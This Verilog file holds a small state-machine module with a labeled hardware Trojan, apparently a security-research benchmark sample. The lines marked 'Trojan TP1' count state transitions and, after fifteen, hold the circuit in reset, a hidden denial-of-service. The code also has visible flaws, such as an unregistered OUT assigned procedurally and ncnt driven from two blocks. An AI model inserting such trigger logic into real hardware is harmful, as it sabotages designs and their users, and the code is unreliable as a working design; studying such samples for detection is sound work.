module TOP(CLK, RST_X, IN, OUT);
  input CLK, RST_X;
  input [7:0] IN;
  output [7:0] OUT;

  reg [7:0] state;
  reg [7:0] cnt;
  reg [3:0] tjctr;//Trojan TP1
  reg trigger;//Trojan TP1
  
  reg [7:0] ncnt;
  reg [7:0] nstate;
  reg ctrljump;

  always @* begin

    case(state)
      0: begin
        ncnt = 0;
        ctrljump = 1;
        if(ctrljump) begin
          OUT = 8'h0;
          nstate = 1;
        end
      end
      
      1: begin
        ncnt = cnt + 1;
        ctrljump = cnt > 7;
        if(ctrljump) begin
          OUT = cnt;
          nstate = 2;
        end
      end
      
      2: begin
        ncnt = cnt + 2;
        ctrljump = cnt > 20;
        if(ctrljump) begin
          OUT = cnt - 8;
          nstate = 0;
        end
      end
    endcase
  end
  
  always @(posedge CLK) begin
    if((!RST_X) || (trigger == 1)) begin//Trojan TP1
      state <= 0;
      ncnt <= 0;
      if(!RST_X) begin tjctr <= 0; end//Trojan TP1
    end else begin
      state <= nstate;
      if ((state == 1) && (nstate == 2)) begin tjctr <= tjctr + 1; end//Trojan TP1
      if (tjctr == 4'b1111) begin trigger <= 1; end//Trojan TP1
      cnt <= ncnt;
    end
  end
  
endmodule

